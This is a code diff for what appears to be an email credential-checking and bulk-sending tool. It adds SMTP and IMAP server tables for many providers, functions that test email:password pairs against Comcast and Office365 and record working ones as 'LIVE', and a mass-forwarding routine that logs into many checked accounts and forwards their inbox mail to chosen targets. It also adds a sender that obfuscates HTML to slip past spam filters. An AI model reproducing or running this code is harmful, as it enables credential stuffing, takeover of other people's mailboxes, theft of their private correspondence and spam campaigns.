+    "amazonaws.com": {"servers": [("email-smtp.us-east-1.amazonaws.com", 587, "TLS")], "type": "AWS", "limit": 10000},
+    "sendgrid.net": {"servers": [("smtp.sendgrid.net", 587, "TLS")], "type": "SendGrid", "limit": 1000},
+    "mailgun.org": {"servers": [("smtp.mailgun.org", 587, "TLS")], "type": "Mailgun", "limit": 1000},
+    "zoho.com": {"servers": [("smtp.zoho.com", 587, "TLS")], "type": "Zoho", "limit": 500},
+    "aol.com": {"servers": [("smtp.aol.com", 587, "TLS")], "type": "AOL", "limit": 500},
+    "web.de": {"servers": [("smtp.web.de", 587, "TLS")], "type": "Web.de", "limit": 500},
+    "arcor.de": {"servers": [("mail.arcor.de", 587, "TLS")], "type": "Arcor", "limit": 500},
+    "free.fr": {"servers": [("smtp.free.fr", 465, "SSL")], "type": "Free.fr", "limit": 300},
+    "orange.fr": {"servers": [("smtp.orange.fr", 465, "SSL")], "type": "Orange", "limit": 300},
+    "sfr.fr": {"servers": [("smtp.sfr.fr", 465, "SSL")], "type": "SFR", "limit": 300},
+    "gmx.at": {"servers": [("smtp.gmx.at", 587, "TLS")], "type": "GMX", "limit": 300},
+    "mail.ru": {"servers": [("smtp.mail.ru", 465, "SSL")], "type": "Mail.ru", "limit": 300},
+    "proton.me": {"servers": [("smtp.protonmail.com", 587, "TLS")], "type": "Proton", "limit": 300},
+    "protonmail.com": {"servers": [("smtp.protonmail.com", 587, "TLS")], "type": "Proton", "limit": 300},
+    # --- BRAZIL PRESET ---
+    "uol.com.br": {"servers": [("smtps.uol.com.br", 587, "TLS"), ("smtps.uol.com.br", 465, "SSL")], "type": "UOL", "limit": 500},
+    "bol.com.br": {"servers": [("smtps.bol.com.br", 587, "TLS"), ("smtps.bol.com.br", 465, "SSL")], "type": "BOL", "limit": 500},
+    "ig.com.br": {"servers": [("smtp.ig.com.br", 587, "TLS"), ("smtp.ig.com.br", 465, "SSL")], "type": "IG", "limit": 500},
+    "terra.com.br": {"servers": [("smtp.terra.com.br", 587, "TLS")], "type": "Terra", "limit": 500},
+    # --- TURKEY PRESET ---
+    "mynet.com": {"servers": [("smtp.mynet.com", 465, "SSL")], "type": "Mynet", "limit": 500},
+    "windowslive.com": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
+    # --- ITALY PRESET ---
+    "alice.it": {"servers": [("out.alice.it", 587, "TLS")], "type": "Alice", "limit": 500},
+    "tin.it": {"servers": [("mail.tin.it", 587, "TLS")], "type": "Tin", "limit": 500},
+    # --- SPAIN PRESET ---
+    "movistar.es": {"servers": [("smtp.movistar.es", 25, "PLAIN")], "type": "Movistar", "limit": 300},
+    "telefonica.net": {"servers": [("smtp.telefonica.net", 25, "PLAIN")], "type": "Telefonica", "limit": 300},
+    # --- USA PRESET ---
+    "comcast.net": {"servers": [("smtp.comcast.net", 587, "TLS"), ("smtp.comcast.net", 465, "SSL"), ("outgoing.comcast.net", 587, "TLS")], "type": "Comcast", "limit": 1000},
+    "comcast.com": {"servers": [("smtp.comcast.net", 587, "TLS"), ("smtp.comcast.net", 465, "SSL"), ("outgoing.comcast.net", 587, "TLS")], "type": "Comcast", "limit": 1000},
+    "att.net": {"servers": [("smtp.mail.att.net", 465, "SSL")], "type": "AT&T", "limit": 500},
+    "charter.net": {"servers": [("mobile.charter.net", 587, "TLS")], "type": "Spectrum", "limit": 500},
+    "spectrum.net": {"servers": [("mobile.charter.net", 587, "TLS")], "type": "Spectrum", "limit": 500},
+    "optonline.net": {"servers": [("mail.optonline.net", 465, "SSL")], "type": "Optimum", "limit": 500},
+    "cox.net": {"servers": [("smtp.cox.net", 587, "TLS")], "type": "Cox", "limit": 500},
+    "centurylink.net": {"servers": [("smtp.centurylink.net", 587, "TLS")], "type": "CenturyLink", "limit": 500},
+    # --- GERMANY PRESET ---
+    "gmx.de": {"servers": [("mail.gmx.net", 587, "TLS"), ("mail.gmx.net", 465, "SSL")], "type": "GMX", "limit": 1000},
+    "gmx.net": {"servers": [("mail.gmx.net", 587, "TLS"), ("mail.gmx.net", 465, "SSL")], "type": "GMX", "limit": 1000},
+    "freenet.de": {"servers": [("mx.freenet.de", 587, "TLS")], "type": "Freenet", "limit": 500},
+    "web.de": {"servers": [("smtp.web.de", 587, "TLS")], "type": "Web.de", "limit": 500},
+    "arcor.de": {"servers": [("mail.arcor.de", 587, "TLS")], "type": "Arcor", "limit": 500},
+    "t-online.de": {"servers": [("securesmtp.t-online.de", 587, "TLS")], "type": "T-Online", "limit": 1000},
+    "posteo.de": {"servers": [("posteo.de", 587, "TLS")], "type": "Posteo", "limit": 500},
+    "mailbox.org": {"servers": [("smtp.mailbox.org", 465, "SSL")], "type": "Mailbox.org", "limit": 500},
+    "unitybox.de": {"servers": [("smtp.unitybox.de", 587, "TLS")], "type": "Unitybox", "limit": 500},
+    "vodafone.de": {"servers": [("smtp.vodafone.de", 587, "TLS")], "type": "Vodafone", "limit": 500},
+    "netcologne.de": {"servers": [("smtp.netcologne.de", 587, "TLS")], "type": "NetCologne", "limit": 500},
+    "mnet-online.de": {"servers": [("mail.mnet-online.de", 587, "TLS")], "type": "M-Net", "limit": 500},
+    # --- ISRAEL PRESET ---
+    "walla.co.il": {"servers": [("out.walla.co.il", 587, "TLS")], "type": "Walla", "limit": 500},
+    "walla.com": {"servers": [("out.walla.co.il", 587, "TLS")], "type": "Walla", "limit": 500},
+    # --- EUROPE PRESET ---
+    "libero.it": {"servers": [("smtp.libero.it", 465, "SSL")], "type": "Libero", "limit": 500},
+    "virgilio.it": {"servers": [("smtp.virgilio.it", 465, "SSL")], "type": "Virgilio", "limit": 500},
+    "btinternet.com": {"servers": [("mail.btinternet.com", 465, "SSL")], "type": "BT", "limit": 500},
+    "sky.com": {"servers": [("smtp.tools.sky.com", 465, "SSL")], "type": "Sky", "limit": 500},
+    "talktalk.net": {"servers": [("smtp.talktalk.net", 587, "TLS")], "type": "TalkTalk", "limit": 500},
+    "tiscali.it": {"servers": [("smtp.tiscali.it", 465, "SSL")], "type": "Tiscali", "limit": 500},
+    "o2.pl": {"servers": [("poczta.o2.pl", 465, "SSL")], "type": "O2.pl", "limit": 1000},
+    "seznam.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
+    "email.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
+    "post.cz": {"servers": [("smtp.seznam.cz", 465, "SSL")], "type": "Seznam", "limit": 1000},
+    "telenet.be": {"servers": [("smtp.telenet.be", 587, "TLS")], "type": "Telenet", "limit": 500},
+    "bluewin.ch": {"servers": [("smtpauths.bluewin.ch", 465, "SSL")], "type": "Bluewin", "limit": 500},
+    "online.no": {"servers": [("smtp.online.no", 587, "TLS")], "type": "Online.no", "limit": 500},
+    "earthlink.net": {"servers": [("smtpauth.earthlink.net", 587, "TLS")], "type": "Earthlink", "limit": 500},
+    # --- MIDDLE EAST PRESET ---
+    "bezeqint.net": {"servers": [("out.bezeqint.net", 587, "SSL")], "type": "Bezeq", "limit": 500},
+    "etisalat.ae": {"servers": [("exmail.emirates.net.ae", 587, "TLS")], "type": "Etisalat", "limit": 1000},
+    "emirates.net.ae": {"servers": [("exmail.emirates.net.ae", 587, "TLS")], "type": "Etisalat", "limit": 1000},
+    # --- CANADA PRESET ---
+    "bell.net": {"servers": [("smtphm.sympatico.ca", 587, "TLS")], "type": "Bell", "limit": 500},
+    "sympatico.ca": {"servers": [("smtphm.sympatico.ca", 587, "TLS")], "type": "Bell", "limit": 500},
+    "cogeco.ca": {"servers": [("smtp.cogeco.ca", 465, "SSL")], "type": "Cogeco", "limit": 500},
+    "videotron.ca": {"servers": [("smtp.videotron.ca", 465, "SSL")], "type": "Videotron", "limit": 500},
+    "shaw.ca": {"servers": [("mail.shaw.ca", 587, "TLS")], "type": "Shaw", "limit": 500},
+    "telus.net": {"servers": [("smtp.telus.net", 465, "SSL")], "type": "Telus", "limit": 500},
+    "rogers.com": {"servers": [("smtp.mail.yahoo.com", 465, "SSL")], "type": "Yahoo", "limit": 500},
+    "upei.ca": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 500},
+    "uwaterloo.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
+    "utoronto.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
+    "ubc.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
+    "mcgill.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 500},
+    "ualberta.ca": {"servers": [("smtp.gmail.com", 587, "TLS")], "type": "Gmail", "limit": 500},
+    "canada.ca": {"servers": [("smtp.office365.com", 587, "TLS")], "type": "Microsoft", "limit": 1000},
+    "mail.ca": {"servers": [("smtp.mail.ca", 587, "TLS")], "type": "Mail.ca", "limit": 500},
+    "teksavvy.com": {"servers": [("smtp.teksavvy.com", 587, "TLS")], "type": "TekSavvy", "limit": 500},
+    "eastlink.ca": {"servers": [("smtp.eastlink.ca", 587, "TLS")], "type": "Eastlink", "limit": 500},
+    "sasktel.net": {"servers": [("smtp.sasktel.net", 587, "TLS")], "type": "SaskTel", "limit": 500}
+}
+
+def get_email_config(email: str):
+    dom = email.split('@')[-1].lower()
+    if '.edu' in dom or '.gov' in dom: return SMTP_CONFIGS["office365.com"]
+    if 'yahoo.' in dom: return SMTP_CONFIGS["yahoo.com"]
+    if 'live.' in dom: return SMTP_CONFIGS["live.com"]
+    if 'hotmail.' in dom: return SMTP_CONFIGS["hotmail.com"]
+    if 'outlook.' in dom: return SMTP_CONFIGS["outlook.com"]
+    if 'wanadoo.fr' in dom: return SMTP_CONFIGS["orange.fr"]
+    if 'gmx.' in dom: return SMTP_CONFIGS["gmx.at"]
+    
+    cfg = SMTP_CONFIGS.get(dom)
+    if cfg: return cfg
+    
+    # Broad matches for Canada and Germany as requested
+    if dom.endswith('.ca'):
+        return {"servers": [("smtp." + dom, 587, "TLS"), ("mail." + dom, 587, "TLS"), ("smtp.office365.com", 587, "TLS")], "type": "Generic-CA", "limit": 500}
+    if dom.endswith('.de'):
+        return {"servers": [("smtp." + dom, 587, "TLS"), ("mail." + dom, 587, "TLS")], "type": "Generic-DE", "limit": 500}
+        
+    return None
+
+
+def get_mx_imap(domain: str):
+    try:
+        ans = resolver.resolve(domain, 'MX')
+        mx = sorted(ans, key=lambda r: r.preference)[0].exchange.to_text().lower().rstrip('.')
+
+        # Google
+        if "google" in mx or "gmail" in mx: return "imap.gmail.com", 993, "pop.gmail.com", 995
+        # Microsoft / Office365
+        if "outlook" in mx or "protection.outlook" in mx or "pphosted" in mx or "microsoft" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995
+        # Yahoo (also powers Rogers, AT&T, BellSouth, etc.)
+        if "yahoo" in mx or "yahoodns" in mx: return "imap.mail.yahoo.com", 993, "pop.mail.yahoo.com", 995
+        # GoDaddy
+        if "secureserver" in mx: return "imap.secureserver.net", 993, "pop.secureserver.net", 995
+        # Comcast / Xfinity
+        if "comcast" in mx: return "imap.comcast.net", 993, "pop.comcast.net", 995
+        # AT&T
+        if "att.net" in mx or "prodigy" in mx or "sbcglobal" in mx: return "imap.mail.att.net", 993, "pop.mail.att.net", 995
+        # Cox
+        if "cox.net" in mx: return "imap.cox.net", 993, "pop.cox.net", 995
+        # Charter / Spectrum
+        if "charter" in mx or "spectrum" in mx: return "mobile.charter.net", 993, "mobile.charter.net", 995
+        # CenturyLink / Lumen
+        if "centurylink" in mx or "lumen" in mx: return "imap.centurylink.net", 993, "pop.centurylink.net", 995
+        # Optimum / Cablevision
+        if "optonline" in mx or "cablevision" in mx: return "mail.optonline.net", 993, "mail.optonline.net", 995
+        # Earthlink
+        if "earthlink" in mx: return "imap.earthlink.net", 993, "pop.earthlink.net", 995
+        # AOL
+        if "aol" in mx: return "imap.aol.com", 993, "pop.aol.com", 995
+        # Mail.ru
+        if "mail.ru" in mx or "mxs.mail.ru" in mx: return "imap.mail.ru", 993, "pop.mail.ru", 995
+        # Yandex
+        if "yandex" in mx: return "imap.yandex.ru", 993, "pop.yandex.ru", 995
+        # Zoho
+        if "zoho" in mx: return "imap.zoho.com", 993, "pop.zoho.com", 995
+        # ProtonMail
+        if "proton" in mx or "protonmail" in mx: return "imap.protonmail.com", 993, "pop.protonmail.com", 995
+        # GMX
+        if "gmx" in mx: return "imap.gmx.net", 993, "pop.gmx.net", 995
+        # Web.de
+        if "web.de" in mx: return "imap.web.de", 993, "pop.web.de", 995
+        # T-Online
+        if "t-online" in mx: return "secureimap.t-online.de", 993, "securepop.t-online.de", 995
+        # Freenet
+        if "freenet" in mx: return "mx.freenet.de", 993, "mx.freenet.de", 995
+        # Libero
+        if "libero" in mx: return "imapmail.libero.it", 993, "popmail.libero.it", 995
+        # BT Internet
+        if "btinternet" in mx or ".bt.com" in mx: return "mail.btinternet.com", 993, "mail.btinternet.com", 995
+        # Bell Canada / Sympatico
+        if "sympatico" in mx or "bell.net" in mx or "bell.ca" in mx: return "imaphm.sympatico.ca", 993, "pophm.sympatico.ca", 995
+        # Seznam.cz
+        if "seznam" in mx: return "imap.seznam.cz", 993, "pop.seznam.cz", 995
+        # Onet.pl
+        if "onet.pl" in mx: return "imap.poczta.onet.pl", 993, "pop.poczta.onet.pl", 995
+        # OVH
+        if "ovh" in mx: return "imap." + domain, 993, "pop." + domain, 995
+        # Rackspace / Emailsrvr
+        if "emailsrvr" in mx or "rackspace" in mx: return "secure.emailsrvr.com", 993, "secure.emailsrvr.com", 995
+        # Mimecast
+        if "mimecast" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995
+        # Barracuda
+        if "barracuda" in mx: return "outlook.office365.com", 993, "outlook.office365.com", 995
+
+        # Last resort: if MX host itself contains the domain, try imap.<domain>
+        if domain in mx:
+            return f"imap.{domain}", 993, f"pop.{domain}", 995
+    except: pass
+    return None
+
+def discover_server(domain: str):
+    d = domain.lower()
+    if any(m in d for m in MICROSOFT): return "outlook.office365.com", 993, "outlook.office365.com", 995, "smtp.office365.com", 587
+    if any(g in d for g in GMAIL): return "imap.gmail.com", 993, "pop.gmail.com", 995, "smtp.gmail.com", 465
+    if 'yahoo' in d: return "imap.mail.yahoo.com", 993, "pop.mail.yahoo.com", 995, "smtp.mail.yahoo.com", 465
+    
+    # --- Check KNOWN_IMAP_SERVERS + SMTP_CONFIGS for hardcoded ISP/provider entries ---
+    known_imap = KNOWN_IMAP_SERVERS.get(d)
+    if known_imap:
+        ih, ip = known_imap[0]  # Use first (preferred) IMAP server
+        # Look up SMTP from SMTP_CONFIGS if available
+        smtp_cfg = SMTP_CONFIGS.get(d)
+        if smtp_cfg and smtp_cfg.get("servers"):
+            sh, sp, _ = smtp_cfg["servers"][0]
+        else:
+            sh, sp = f"smtp.{d}", 587
+        return ih, ip, f"pop.{d}", 995, sh, sp
+    
+    # Check DB for user-saved provider
+    p = get_provider(d)
+    if p: return (str(p[0]), int(p[1]), str(p[2]), int(p[3]), str(p[4]), int(p[5]))
+    
+    # Check if SMTP_CONFIGS has this domain (even without IMAP entry) — infer IMAP
+    smtp_cfg = SMTP_CONFIGS.get(d)
+    if smtp_cfg and smtp_cfg.get("servers"):
+        sh, sp, _ = smtp_cfg["servers"][0]
+        return f"imap.{d}", 993, f"pop.{d}", 995, sh, sp
+    
+    # MX record lookup
+    mx = get_mx_imap(d)
+    if mx:
+        # Also try to find SMTP from SMTP_CONFIGS
+        smtp_cfg = SMTP_CONFIGS.get(d)
+        if smtp_cfg and smtp_cfg.get("servers"):
+            sh, sp, _ = smtp_cfg["servers"][0]
+        else:
+            sh, sp = f"smtp.{d}", 587
+        return mx[0], mx[1], mx[2], mx[3], sh, sp
+    
+    # Active Probe Fallback for Custom Domains
+    prefixes = ['imap', 'mail', 'ssl0', 'outlook', 'mx', 'webmail', 'secure', 'inbound', 'imap-mail', 'host']
+    for pref in prefixes:
+        for port in [993, 143]:
+            try:
+                srv = f"{pref}.{d}"
+                with socket.create_connection((srv, port), timeout=2):
+                    return srv, port, f"pop.{d}", 995, f"smtp.{d}", 587
+            except: continue
+    
+    # Try common provider subdomains directly
+    if 'business' in d or 'corp' in d:
+        if check_port('imap.secureserver.net', 993): return 'imap.secureserver.net', 993, 'pop.secureserver.net', 995, 'smtpout.secureserver.net', 465
+
+    # Direct domain probe
+    for port in [993, 143]:
+        try:
+            with socket.create_connection((d, port), timeout=2):
+                return d, port, d, 995, d, 587
+        except: continue
+        
+    return f"imap.{d}", 993, f"pop.{d}", 995, f"smtp.{d}", 587
+
+def discover_smtp(domain: str):
+    d = domain.lower()
+    if d in state.smtp_cache: return state.smtp_cache[d]
+
+    def _do_disc():
+        cfg = SMTP_CONFIGS.get(d)
+        if isinstance(cfg, dict):
+            servers = cfg.get("servers", [])
+            if servers: return str(servers[0][0]), int(servers[0][1])
+        
+        if any(m in d for m in MICROSOFT): return "smtp.office365.com", 587
+        if any(g in d for g in GMAIL): return "smtp.gmail.com", 587
+        if 'yahoo' in d: return "smtp.mail.yahoo.com", 587
+        
+        # MX record discovery
+        try:
+            ans = resolver.resolve(d, 'MX')
+            mx = sorted(ans, key=lambda r: r.preference)[0].exchange.to_text().lower().rstrip('.')
+            for port in [587, 465, 25]:
+                try:
+                    with socket.create_connection((mx, port), timeout=2): return mx, port
+                except: continue
+        except: pass
+
+        # Probe common SMTP subdomains
+        prefixes = ['smtp', 'mail', 'ssl0', 'outbound', 'smtp-mail', 'pro']
+        for pref in prefixes:
+            for port in [587, 465, 25]:
+                try:
+                    srv = f"{pref}.{d}"
+                    with socket.create_connection((srv, port), timeout=2): return srv, port
+                except: continue
+                
+        # Try direct domain
+        for port in [587, 465, 25]:
+            try:
+                with socket.create_connection((d, port), timeout=2): return d, port
+            except: continue
+            
+        return f"smtp.{d}", 587
+
+    res = _do_disc()
+    state.smtp_cache[d] = res
+    return res
+
+# ============================================
+# NEW ENHANCED FUNCTIONS - COMCAST, OFFICE365, FORWARDING
+# ============================================
+
+async def check_comcast_smtp(email: str, password: str, timeout: int = 10) -> Dict[str, Any]:
+    """Enhanced Comcast SMTP checker with multiple server fallbacks"""
+    servers = [
+        ("smtp.comcast.net", 587, "TLS"),
+        ("smtp.comcast.net", 465, "SSL"),
+        ("outgoing.comcast.net", 587, "TLS"),
+    ]
+    
+    for server, port, encryption in servers:
+        try:
+            if encryption == "SSL" or port == 465:
+                smtp = smtplib.SMTP_SSL(server, port, context=ctx, timeout=timeout)
+                smtp.ehlo(server)
+            else:
+                smtp = smtplib.SMTP(server, port, timeout=timeout)
+                smtp.ehlo(server)
+                try:
+                    smtp.starttls(context=ctx)
+                    smtp.ehlo(server)
+                except smtplib.SMTPNotSupportedError:
+                    pass
+            
+            smtp.login(email, password)
+            smtp.quit()
+            return {
+                "status": "LIVE",
+                "email": email,
+                "password": password,
+                "server": server,
+                "port": port,
+                "encryption": encryption,
+                "type": "Comcast",
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+        except Exception as e:
+            continue
+    
+    return {"status": "DEAD", "email": email, "error": str(e)}
+
+def safe_execute_with_retry(func, *args, **kwargs):
+    """Executes a function with exponential backoff retry logic"""
+    max_retries = state.max_retries
+    delay = state.retry_delay
+    
+    last_exception = None
+    for attempt in range(max_retries + 1):
+        try:
+            return func(*args, **kwargs)
+        except (imaplib.IMAP4.error, poplib.error_proto, smtplib.SMTPException, socket.timeout, socket.error, ssl.SSLError) as e:
+            last_exception = e
+            if attempt < max_retries:
+                # Exponential backoff: delay * (2 ^ attempt)
+                sleep_time = delay * (2 ** attempt)
+                time.sleep(sleep_time)
+            else:
+                raise e
+        except Exception as e:
+            # For non-network errors, don't retry unless specified
+            raise e
+    return None
+
+def verify_imap_access(email: str, password: str) -> Dict[str, Any]:
+    domain = email.split('@')[-1].lower()
+    ih, ip, _, _, _, _ = discover_server(domain)
+    
+    def _do_check():
+        if int(ip) == 993:
+            with imaplib.IMAP4_SSL(ih, int(ip), timeout=state.timeout, ssl_context=ctx) as m:
+                m.login(email, password)
+                m.select('INBOX', readonly=True)
+                m.logout()
+        else:
+            with imaplib.IMAP4(ih, int(ip), timeout=state.timeout) as m:
+                try:
+                    m.starttls(ssl_context=ctx)
+                except:
+                    pass
+                m.login(email, password)
+                m.select('INBOX', readonly=True)
+                m.logout()
+        return {"ok": True, "server": ih, "port": int(ip)}
+
+    try:
+        return safe_execute_with_retry(_do_check)
+    except imaplib.IMAP4.error as ex:
+        err_msg = str(ex)
+        if "authentication failed" in err_msg.lower() or "login failed" in err_msg.lower():
+            return {"ok": False, "server": ih, "port": int(ip), "error": "Invalid Credentials"}
+        return {"ok": False, "server": ih, "port": int(ip), "error": f"IMAP Auth Error: {err_msg}"}
+    except socket.timeout:
+        return {"ok": False, "server": ih, "port": int(ip), "error": "Connection Timeout"}
+    except socket.error as ex:
+        return {"ok": False, "server": ih, "port": int(ip), "error": f"Network Error: {str(ex)}"}
+    except Exception as ex:
+        return {"ok": False, "server": ih, "port": int(ip), "error": str(ex)}
+
+async def check_office365_smtp(email: str, password: str, timeout: int = 10) -> Dict[str, Any]:
+    """Enhanced Office365 SMTP checker with primary & fallback servers"""
+    servers = [
+        ("smtp.office365.com", 587, "TLS"),
+        ("smtp.office365.com", 465, "SSL"),
+        ("smtp-mail.outlook.com", 587, "TLS"),
+    ]
+    
+    for server, port, encryption in servers:
+        try:
+            if encryption == "SSL" or port == 465:
+                smtp = smtplib.SMTP_SSL(server, port, context=ctx, timeout=timeout)
+                smtp.ehlo(server)
+            else:
+                smtp = smtplib.SMTP(server, port, timeout=timeout)
+                smtp.ehlo(server)
+                try:
+                    smtp.starttls(context=ctx)
+                    smtp.ehlo(server)
+                except smtplib.SMTPNotSupportedError:
+                    pass
+            
+            smtp.login(email, password)
+            smtp.quit()
+            return {
+                "status": "LIVE",
+                "email": email,
+                "password": password,
+                "server": server,
+                "port": port,
+                "encryption": encryption,
+                "type": "Office365",
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+        except Exception as e:
+            continue
+    
+    return {"status": "DEAD", "email": email, "error": str(e)}
+
+async def forward_emails_inbox_to_inbox(
+    source_email: str,
+    source_password: str,
+    target_emails: List[str],
+    limit: int = 50,
+    mark_as_read: bool = False
+) -> Dict[str, Any]:
+    """
+    Forward emails from source inbox to target email list (Inbox to Inbox)
+    Supports Gmail, Outlook, and generic IMAP servers
+    """
+    results = {
+        "forwarded": 0,
+        "failed": 0,
+        "errors": [],
+        "target_emails": target_emails,
+        "targets_reached": []
+    }
+    
+    try:
+        domain = source_email.split('@')[1].lower()
+        imap_host, imap_port, _, _, smtp_host, smtp_port = discover_server(domain)
+        
+        # Connect to IMAP
+        if imap_port == 993:
+            imap = imaplib.IMAP4_SSL(imap_host, imap_port, timeout=15)
+        else:
+            imap = imaplib.IMAP4(imap_host, imap_port, timeout=15)
+        
+        imap.login(source_email, source_password)
+        imap.select('INBOX')
+        
+        # Get emails
+        status, messages = imap.search(None, 'ALL')
+        email_ids = messages[0].split()[-limit:] if messages[0] else []
+        
+        # Connect to SMTP for forwarding
+        smtp = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
+        smtp.starttls()
+        smtp.login(source_email, source_password)
+        
+        for msg_id in email_ids:
+            try:
+                status, msg_data = imap.fetch(msg_id, '(RFC822)')
+                email_body = msg_data[0][1]
+                email_message = message_from_bytes(email_body)
+                
+                # Create forward message
+                forward_msg = MIMEMultipart()
+                forward_msg['From'] = source_email
+                forward_msg['Subject'] = format_header_subject(f"FWD: {email_message.get('Subject', 'No Subject')}")
+                forward_msg['Date'] = formatdate(localtime=True)
+                
+                body_text = f"""
+---------- Forwarded message ----------
+From: {email_message.get('From', 'Unknown')}
+Date: {email_message.get('Date', 'Unknown')}
+Subject: {email_message.get('Subject', 'No Subject')}
+To: {email_message.get('To', 'Unknown')}
+
+{email_message.get_payload(decode=True).decode('utf-8', errors='ignore') if email_message.get_payload() else 'No content'}
+"""
+                
+                forward_msg.attach(MIMEText(body_text, 'plain'))
+                
+                # Send to all target emails
+                for target in target_emails:
+                    try:
+                        smtp.send_message(forward_msg, from_addr=source_email, to_addrs=target)
+                        results["forwarded"] += 1
+                        if target not in results["targets_reached"]:
+                            results["targets_reached"].append(target)
+                    except Exception as e:
+                        results["failed"] += 1
+                        results["errors"].append(f"Failed to send to {target}: {str(e)}")
+                
+                # Mark as read if requested
+                if mark_as_read:
+                    imap.store(msg_id, '+FLAGS', '\\Seen')
+                    
+            except Exception as e:
+                results["failed"] += 1
+                results["errors"].append(f"Error processing message {msg_id}: {str(e)}")
+        
+        imap.close()
+        imap.logout()
+        smtp.quit()
+        
+        results["success"] = True
+        results["timestamp"] = datetime.datetime.now().isoformat()
+        
+    except Exception as e:
+        results["success"] = False
+        results["error"] = str(e)
+    
+    return results
+
+async def mass_forward_to_inbox(
+    valid_emails_list: List[str],
+    target_recipients: List[str],
+    max_emails_per_account: int = 20,
+    delay_between_accounts: float = 2.0
+) -> Dict[str, Any]:
+    """
+    Mass forward emails from multiple valid accounts to target recipients
+    Powerful tool for inbox-to-inbox operations
+    """
+    summary = {
+        "total_accounts": len(valid_emails_list),
+        "total_targets": len(target_recipients),
+        "accounts_processed": 0,
+        "total_forwarded": 0,
+        "total_failed": 0,
+        "per_account_results": []
+    }
+    
+    for account_data in valid_emails_list:
+        try:
+            # Parse account data (email:password format)
+            if isinstance(account_data, str):
+                parts = account_data.split(':')
+                if len(parts) < 2:
+                    continue
+                email, password = parts[0], parts[1]
+            else:
+                email = account_data.get('email')
+                password = account_data.get('password')
+            
+            result = await forward_emails_inbox_to_inbox(
+                email, password, target_recipients, 
+                limit=max_emails_per_account
+            )
+            
+            summary["per_account_results"].append({
+                "email": email,
+                "forwarded": result.get("forwarded", 0),
+                "failed": result.get("failed", 0),
+                "success": result.get("success", False)
+            })
+            
+            summary["accounts_processed"] += 1
+            summary["total_forwarded"] += result.get("forwarded", 0)
+            summary["total_failed"] += result.get("failed", 0)
+            
+            await asyncio.sleep(delay_between_accounts)
+            
+        except Exception as e:
+            continue
+    
+    summary["timestamp"] = datetime.datetime.now().isoformat()
+    return summary
+
+async def powerful_smtp_sender(
+    from_email: str,
+    from_password: str,
+    to_emails: List[str],
+    subject: str,
+    body: str,
+    html_body: str = None,
+    attachments: List[str] = None,
+    signature: str = None,
+    encrypt_body: bool = False,
+    retry_count: int = 3
+) -> Dict[str, Any]:
+    """Powerful SMTP sender with async retry logic, attachments, and HTML support."""
+    result = {
+        "from": from_email,
+        "to": to_emails,
+        "sent": 0,
+        "failed": 0,
+        "failed_recipients": [],
+        "retries_used": 0
+    }
+    
+    domain = from_email.split('@')[1].lower()
+    cfg = SMTP_CONFIGS.get(domain, {})
+    servers = cfg.get("servers", [("smtp.gmail.com", 587, "TLS")])
+    
+    message = MIMEMultipart('alternative')
+    message['From'] = from_email
+    message['Subject'] = format_header_subject(subject)
+    message['Date'] = formatdate(localtime=True)
+    message['Message-ID'] = make_msgid()
+    
+    if encrypt_body and html_body:
+        # Anti-spam: safely inject HTML comments only into text nodes so the HTML
+        # structure stays valid and ALL email clients render it normally.
+        obf_html = obfuscate_html(html_body)
+        obf_html += f'<!--MSG:{randstr(18)}-->'
+        plain_part = MIMEText(html_to_plain(body), 'plain', 'utf-8')
+        html_part  = MIMEText(obf_html, 'html', 'utf-8')
+        message.attach(plain_part)
+        message.attach(html_part)
+    elif encrypt_body and not html_body:
+        # Plain-text body: wrap in HTML and obfuscate safely
+        html_wrap = f'<html><body><div>{body}</div></body></html>'
+        obf_html  = obfuscate_html(html_wrap)
+        message.attach(MIMEText(body, 'plain', 'utf-8'))
+        message.attach(MIMEText(obf_html, 'html', 'utf-8'))
+    else:
+        if html_body:
+            message.attach(MIMEText(body, 'plain', 'utf-8'))
+            message.attach(MIMEText(html_body, 'html', 'utf-8'))
+        else:
+            if signature:
+                body += f"\n\n{signature}"
+            message.attach(MIMEText(body, 'plain'))
+
+    
+    if attachments:
+        for file_path in attachments:
+            if os.path.exists(file_path):
+                with open(file_path, 'rb') as f:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(f.read())
+                    encoders.encode_base64(part)
+                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
+                    message.attach(part)
+    
+    loop = asyncio.get_event_loop()
+    
+    for attempt in range(retry_count):
+        for server, port, encryption in servers:
+            try:
+                def send_smtp(server=server, port=port, encryption=encryption):
+                    if encryption == "SSL" or port == 465:
+                        s = smtplib.SMTP_SSL(server, port, context=ctx, timeout=15)
+                        s.ehlo(server)
+                    else:
+                        s = smtplib.SMTP(server, port, timeout=15)
+                        s.ehlo(server)
+                        try:
+                            s.starttls(context=ctx)
+                            s.ehlo(server)
+                        except smtplib.SMTPNotSupportedError:
+                            pass  # STARTTLS not supported, continue plain
+                    s.login(from_email, from_password)
+                    for recipient in to_emails:
+                        try:
+                            s.send_message(message, from_addr=from_email, to_addrs=recipient)
+                            result["sent"] += 1
+                        except Exception:
+                            result["failed"] += 1
+                            result["failed_recipients"].append(recipient)
+                    s.quit()
+                
+                await loop.run_in_executor(None, send_smtp)
+                result["retries_used"] = attempt
+                result["success"] = True
+                result["timestamp"] = datetime.datetime.now().isoformat()
+                return result
+            except Exception as e:
+                if attempt == retry_count - 1:
+                    result["error"] = str(e)
+                continue
+    
+    result["success"] = False
+    return result
+
+class GlobalState:
+    def __init__(self):
+        self.checked = 0; self.valid = 0; self.bad = 0; self.hits = 0
+        self.is_running = False; self.stop_requested = False
